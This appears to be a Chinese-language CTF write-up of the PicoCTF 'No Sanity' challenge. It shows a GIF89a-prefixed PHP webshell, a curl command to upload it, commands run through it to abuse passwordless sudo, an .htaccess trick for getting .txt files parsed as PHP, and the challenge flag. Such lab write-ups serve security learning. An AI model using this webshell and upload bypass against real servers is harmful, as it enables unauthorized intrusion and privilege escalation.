# CTF-08：文件上传 + Webshell + sudo 提权

> PicoCTF — No Sanity.
> "GIF89a" 开局，shell 收尾。
> 关联：[[CTF-01_Session不过期与Cookie劫持.md]]

---

## 题目

一个头像上传页面，`upload.php`，没有任何文件类型校验（"No Sanity"）。目标是拿到 `/root/flag.txt`。

---

## 解题过程

### Step 1：发现漏洞

```html
<input type="file" onchange="loadFile(event)" ...>
```

JS 里 `var type = file.type;` 读取了文件类型，但没有做任何校验。未使用变量，形同虚设。

`upload.php` 服务端同样没有校验。标题 "No Sanity" = 没有 check。

### Step 2：上传 webshell

shell.php 文件内容：

```php
GIF89a<?php system($_GET['cmd']); ?>
```

- `GIF89a` 是 GIF 文件头，绕过简单的 magic bytes 检查
- `system($_GET['cmd'])` 通过 URL 参数执行任意命令

上传：

```bash
curl -X POST http://target/upload.php \
  -F "fileToUpload=@shell.php" \
  -F "submit=Upload File"
```

响应：

```
The file shell.php has been uploaded Path: uploads/shell.php
```

### Step 3：验证 webshell

```
http://target/uploads/shell.php?cmd=echo%20hello
```

返回 `GIF89ahello`，确认 PHP 被执行。

### Step 4：信息收集

```
?cmd=whoami      → www-data（Apache 运行用户）
?cmd=ls /        → bin boot dev etc home ...
?cmd=sudo -l     → 发现 www-data 可以无密码执行 sudo
?cmd=sudo ls /root → flag.txt
```

### Step 5：提权拿 flag

```
?cmd=sudo%20cat%20/root/flag.txt
```

```
picoCTF{wh47_c4n_u_d0_wPHP_075b4e66}
```

---

## 知识点

| 概念 | 说明 |
|------|------|
| 无限制文件上传 | 服务端未校验文件类型和内容，允许上传任意文件 |
| multipart/form-data | 文件上传的 HTTP 协议格式，boundary 分隔各字段 |
| webshell | 一句话木马，通过 `$_GET['cmd']` 执行系统命令 |
| URL 编码 | `%20` = 空格，`%2F` = `/`，shell 命令需编码 |
| sudo 提权 | `www-data` 意外拥有无密码 sudo 权限 → 直接读 `/root` |
| .htaccess | Apache 目录配置，可改写解析规则（如 .txt → PHP） |

## 另一种解法

如果 `uploads/` 禁了 PHP 执行（返回 `GIF89a` 不带命令输出），可以：

1. 上传 `.htaccess`：`AddType application/x-httpd-php .txt`
2. 上传 `shell.txt`：内容同上，后缀改为 `.txt`
3. Apache 会把 `.txt` 当 PHP 解析

> 组合拳前提：服务器是 Apache，且没拦 `.` 开头的文件名。

---

## 反思

- 上传校验是双端的——前端可以绕过，后端才是底线
- 信息收集比直接攻击重要：`whoami` → `sudo -l` 的链路比暴力猜路径高效
- 成功的关键不是知道多少工具，是知道"下一步该问什么问题"
